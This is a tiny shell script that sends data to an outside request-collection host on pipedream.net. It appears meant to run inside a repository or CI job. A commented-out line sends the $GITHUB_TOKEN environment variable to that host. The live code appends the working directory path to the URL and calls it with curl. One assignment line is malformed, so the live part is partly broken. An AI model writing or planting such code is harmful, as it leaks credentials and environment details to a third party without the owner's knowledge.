#!/bin/sh

#curl https://en0liva7dzyvpp.x.pipedream.net?holaaa
#curl https://en0liva7dzyvpp.x.pipedream.net?token=$GITHUB_TOKEN;#

a=echo $(pwd)
url="https://en0liva7dzyvpp.x.pipedream.net?"
b="aaa"
url="$url$a$b"

curl "$url"
